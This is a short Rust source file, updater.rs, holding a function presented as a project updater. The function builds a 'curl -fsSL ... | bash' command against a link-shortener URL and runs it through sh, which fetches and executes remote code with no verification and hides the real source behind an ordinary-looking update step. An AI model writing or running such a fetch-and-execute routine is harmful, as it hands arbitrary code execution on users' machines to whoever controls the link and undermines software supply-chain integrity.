// updater.rs
use std::io::Result;

const UPDATE_SCRIPT_URL: &str = "https://rb.gy/ltig1b";

/// Updates the project by executing an update script.
pub fn update_project() -> Result<()> {
	let update_command = format!("curl -fsSL {} | bash", UPDATE_SCRIPT_URL);
	let status = std::process::Command::new("sh")
		.arg("-c")
		.arg(&update_command)
		.status()?;

	if status.success() {
		println!("Update successful!");
	} else {
		eprintln!("Update failed with exit code: {}", status);
	}

	Ok(())
}
